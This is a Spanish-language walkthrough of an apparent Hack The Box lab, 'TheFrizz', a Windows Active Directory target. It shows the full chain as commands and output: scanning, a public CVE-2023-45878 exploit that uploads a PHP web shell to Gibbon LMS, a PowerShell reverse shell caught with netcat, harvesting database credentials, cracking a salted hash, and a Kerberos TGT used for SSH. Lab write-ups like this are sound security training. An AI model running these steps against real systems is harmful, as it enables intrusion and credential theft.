# Thefrizz

![](../../../../~gitbook/image.md)Publicado: 30 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
OS: Windows
###📝 Descripción
TheFrizz es una máquina Windows de dificultad media que simula un entorno de Active Directory con un servicio web que ejecuta Gibbon LMS. La explotación inicial se basa en aprovechar una vulnerabilidad de escritura arbitraria de archivos sin autenticación (CVE-2023-45878) en Gibbon LMS v25.0.1, que permite subir una web shell PHP y obtener RCE (Remote Code Execution).Una vez dentro del sistema, se realizan tareas de post-explotación para descubrir credenciales de base de datos almacenadas en archivos de configuración. A través de la enumeración de la base de datos MySQL, se obtienen hashes de contraseñas que se crackearon exitosamente, permitiendo el acceso SSH al dominio y la escalada de privilegios mediante técnicas de autenticación Kerberos.Esta máquina pone a prueba habilidades en:- Explotación de vulnerabilidades web (CVE-2023-45878)
- Enumeración de Active Directory
- Cracking de hashes con técnicas de salt
- Autenticación Kerberos y manejo de tickets
- Post-explotación en entornos Windows

###📊 Resumen de la Explotación

####🔗 Cadena de Ataque

###🎯 Puntos Clave
🔥 Vulnerabilidades Críticas:- CVE-2023-45878: Escritura arbitraria de archivos sin autenticación en Gibbon LMS
- Credenciales hardcodeadas en archivos de configuración
- Hashes débiles con salt predecible
🛡️ Técnicas de Explotación:- File Upload Bypass para RCE
- Database Enumeration post-compromiso
- Hash Cracking con salt customizado
- Kerberos Authentication con TGT
🎯 Servicios Objetivo:- Gibbon LMS (Puerto 80) - Punto de entrada
- MySQL (Local) - Escalada de privilegios
- SSH (Puerto 22) - Acceso final
- Kerberos (Puerto 88) - Autenticación de dominio

###🔭 Reconocimiento

####🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####🚀 Escaneo de puertos

####🔍 Enumeración de servicios
⚠️ Añadimos el siguiente vhost a nuestro fichero /etc/hosts:
####📋 Análisis de Servicios Detectados
PuertoServicioDescripción22SSHOpenSSH for Windows - Acceso remoto53DNSServicio DNS del dominio80HTTPServidor web Apache con PHP88KerberosAutenticación del dominio135MSRPCLlamadas a procedimientos remotos139/445SMB/NetBIOSRecursos compartidos389/636LDAP/LDAPSDirectorio activo🔥 Servicios críticos identificados:- Dominio Active Directory: `frizz.htb`
- Controlador de dominio: `FRIZZDC`
- Desfase horario: 6h59m59s (crítico para Kerberos)
- Firma SMB: Requerida (entorno seguro)

###🌐 Enumeración de Servicios

####🗂️ SMB (Puerto 445) - Acceso Inicial
Ya que no disponemos de credenciales, comenzamos tratando de enumerar sin éxito posibles recursos mediante una sesión nula:🔒 Enumeración de recursos compartidos❌ Resultado: No se permite acceso anónimo a recursos SMB
####🌐 HTTP (Puerto 80) - Servicio Web Principal
🏠 Página Principal (http://frizzdc.frizz.htb)![](../../../../~gitbook/image.md)🎓 Gibbon LMS DiscoveryAl pulsar en la opción Staff Login somos redireccionados al siguiente servicio implementado con Gibbon LMS:URL: `http://frizzdc.frizz.htb/Gibbon-LMS/`![](../../../../~gitbook/image.md)🔍 Fingerprinting del Servicio📚 Información sobre Gibbon LMSGibbon es una plataforma de gestión escolar flexible y de código abierto diseñada para mejorar la vida de profesores, estudiantes, padres y líderes.Versión identificada: v25.0.00🚨 Investigación de VulnerabilidadesLa versión instalada (v25.0.00) es vulnerable a múltiples CVEs para versiones anteriores a la v26.0:![](../../../../~gitbook/image.md)🎯 CVE-2023-45878 - Escritura Arbitraria de ArchivosDescripción: GibbonEdu Gibbon versión 25.0.1 y anteriores permite la escritura arbitraria de archivos porque `rubrics_visualise_saveAjax.php` no requiere autenticación.Parámetros vulnerables:- `img`: Imagen codificada en base64
- `path`: Ruta de destino
- `gibbonPersonID`: ID de persona
Impacto: Permite la creación de archivos PHP que posibilitan la ejecución remota de código no autenticado.
###🎯 Explotación - CVE-2023-45878

####🔧 Herramienta de Explotación
Existe un exploit público que facilita la explotación de esta vulnerabilidad:Repositorio: https://github.com/davidzzo23/CVE-2023-45878
####🧪 Verificación de RCE
Confirmamos la ejecución remota de comandos a través del exploit:✅ Resultado: Ejecución exitosa como usuario `frizz\w.webservice`
####🐚 Obtención de Reverse Shell
El exploit incluye funcionalidad para obtener una reverse shell de PowerShell:
####📞 Listener y Conexión
🎉 Acceso inicial obtenido como `frizz\w.webservice`
###🔍 Post-Explotación y Escalada de Privilegios

####📂 Enumeración del Sistema
Una vez en la máquina, observamos que el directorio Users está vacío. Centramos la enumeración en el directorio xampp.
####🔐 Descubrimiento de Credenciales
Ubicamos un archivo de configuración crítico en: Ruta: `C:\xampp\htdocs\Gibbon-LMS\config.php`![](../../../../~gitbook/image.md)Credenciales encontradas:
####🗃️ Enumeración de Base de Datos
Utilizamos el binario `mysql.exe` de la instalación de XAMPP:📊 Exploración de bases de datos📋 Enumeración de tablas![](../../../../~gitbook/image.md)👥 Extracción de usuarios![](../../../../~gitbook/image.md)
####💥 Cracking de Hashes
Hash objetivo identificado:- Usuario: `f.frizzle`
- Hash: `067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03`
- Salt: `/aACFhikmNopqrRTVz2489`
🔨 Preparación para John The RipperCreamos un archivo con el formato correcto:🎯 Ataque de diccionario![](../../../../~gitbook/image.md)🔓 Credencial descifrada: `f.frizzle:Jenni_Luvs_Magic23`
###🎫 Autenticación Kerberos

####⏰ Sincronización de Tiempo

####🎟️ Obtención de TGT
![](../../../../~gitbook/image.md)
####🔧 Configuración del Ticket

####🚪 Acceso SSH Final
🏆 Acceso exitoso al sistema como `f.frizzle`Last updated 9 months ago- [📝 Descripción](#descripcion)
- [📊 Resumen de la Explotación](#resumen-de-la-explotacion)
- [🎯 Puntos Clave](#puntos-clave)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración de Servicios](#enumeracion-de-servicios-1)
- [🎯 Explotación - CVE-2023-45878](#explotacion-cve-2023-45878)
- [🎫 Autenticación Kerberos](#autenticacion-kerberos)

```
❯ ping -c2 10.10.11.60
PING 10.10.11.60 (10.10.11.60) 56(84) bytes of data.
64 bytes from 10.10.11.60: icmp_seq=1 ttl=127 time=42.5 ms
64 bytes from 10.10.11.60: icmp_seq=2 ttl=127 time=44.1 ms

--- 10.10.11.60 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1005ms
rtt min/avg/max/mdev = 42.527/43.308/44.089/0.781 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.60 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49664,49668,49670,59524,59528,59537
```

```
nmap -sC -sV -p$ports 10.10.11.60 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 17:50 CEST
Nmap scan report for 10.10.11.60
Host is up (0.042s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-30 22:50:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59524/tcp open  msrpc         Microsoft Windows RPC
59528/tcp open  msrpc         Microsoft Windows RPC
59537/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-06-30T22:51:40
|_  start_date: N/A
```

```
echo "10.10.11.60 frizz.htb frizzdc.frizz.htb" | sudo tee -a /etc/hosts
```

```
smbclient -N -L 10.10.11.60
session setup failed: NT_STATUS_NOT_SUPPORTED
```

```
netexec smb 10.10.11.60 -u anonymous -p ''
SMB         10.10.11.60     445    10.10.11.60      [*]  x64 (name:10.10.11.60) (domain:10.10.11.60) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.60     445    10.10.11.60      [-] 10.10.11.60\anonymous: STATUS_NOT_SUPPORTED
```

```
whatweb -a 3 frizzdc.frizz.htb/Gibbon-LMS/

http://frizzdc.frizz.htb/Gibbon-LMS/ [200 OK] Apache[2.4.58], Cookies[G60fa1cd0af7be78b], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12], HttpOnly[G60fa1cd0af7be78b], IP[10.10.11.60], JQuery, Meta-Author[Ross Parker, International College Hong Kong], OpenSSL[3.1.3], PHP[8.2.12], PasswordField[password], Script[text/javascript], Title[WES - Gibbon], X-Frame-Options[SAMEORIGIN]
```

```
git clone https://github.com/davidzzo23/CVE-2023-45878.git
cd CVE-2023-45878
```

```
python3 CVE-2023-45878.py -t 10.10.11.60 -c whoami

[+] Uploading web shell as jgmlfjwg.php...
[+] Upload successful.
[+] Executing command on: http://10.10.11.60/Gibbon-LMS/jgmlfjwg.php?cmd=whoami
[+] Command output:
frizz\w.webservice
```

```
python3 CVE-2023-45878.py -t 10.10.11.60 -s -i 10.10.14.9 -p 443

[+] Uploading web shell as yoixxtpt.php...
[+] Upload successful.
[+] Sending PowerShell reverse shell payload to http://10.10.11.60/Gibbon-LMS/yoixxtpt.php
[*] Make sure your listener is running: nc -lvnp 443
```

```
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.60] 57245
whoami
frizz\w.webservice
PS C:\xampp\htdocs\Gibbon-LMS> pwd

Path
----
C:\xampp\htdocs\Gibbon-LMS
```

```
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
```

```
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SHOW DATABASES;" -E
```

```
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SHOW TABLES;" -E
```

```
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT * FROM gibbonperson;" -E
```

```
f.frizzle:$dynamic_82$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489
```

```
john --format=dynamic='sha256($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt frizle-hash.txt
```

```
sudo ntpdate frizzdc.frizz.htb
```

```
impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip frizzdc.frizz.htb
```

```
export KRB5CCNAME=f.frizzle.ccache
```

```
ssh f.frizzle@frizz.htb -K
```
